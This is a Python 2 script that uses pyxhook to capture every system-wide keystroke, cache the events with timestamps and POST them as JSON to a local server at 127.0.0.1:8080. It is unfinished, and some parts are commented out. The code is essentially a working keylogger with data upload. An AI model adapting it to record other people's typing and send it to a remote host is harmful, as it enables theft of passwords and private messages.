import requests

import sys
import os

sys.path.append(os.path.abspath("../pyxhook-master/")) #To allow for the pyxhook library to work

import pyxhook
import time
import parsingTool
import PackageData
import EventData
import json
import threading
import SimpleHTTPServer
import SocketServer

running = False
cache = []
startTime = 0
endTime = 0
PORT = 1234

class MyRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        sendData(cache)
        return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

def listenForRequest():
    global PORT
    Handler = MyRequestHandler
    httpd = SocketServer.TCPServer(("", PORT), Handler)
    print "Serving at port", PORT
    httpd.serve_forever()

def sendData(cache):
    stringData = PackageData.PackageData(cache, startTime, endTime)
    #writeToBigtable(btinf1, stringData)

    # Sending Data via JSON below:
    stringData = PackageData.PackageData(cache, startTime, endTime).packageData_JSON()
    headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
    r = requests.post("http://127.0.0.1:8080/recieveData", data=json.dumps(stringData), headers=headers)

def cacheData(event, time):
    #This should create a JSON object as a cache... TODO
    #Only relevent data should be cached and stored. Need a filter... TODO
    #Cache data for certain period.
    global cache
    cache.append(EventData.EventData(event, time).getObject())

def kbevent (event):
    #print event
    #print event
    # Cache the data.
    cacheData(event, time.time())
    #Send data to server after given period.
    #print cache

    global startTime
    global endTime

    #print startTime
    #print endTime

    #Kill logging if given code is hit.
    if event.Ascii == 65:
        global running
        running = False
        sendData(cache)

def runHook():
    hm = pyxhook.HookManager()
    hm.KeyDown = kbevent
    hm.HookKeyboard()
    hm.start()

    global running
    running = True

    global endTime
    global startTime
    startTime = time.time()

    while running:
        if(time.time() > endTime):
            #sendData(cache)
            #cache[:] = [] #clear cache
            startTime = time.time() #reset timer
            endTime = startTime + 5
        time.sleep(0.1)

    hm.cancel()

def main():
    hookThread = threading.Thread(target=runHook)
    #listeningThread = threading.Thread(target=listenForRequest)
    hookThread.start()
    #listeningThread.start()


if __name__ == '__main__':
    main()
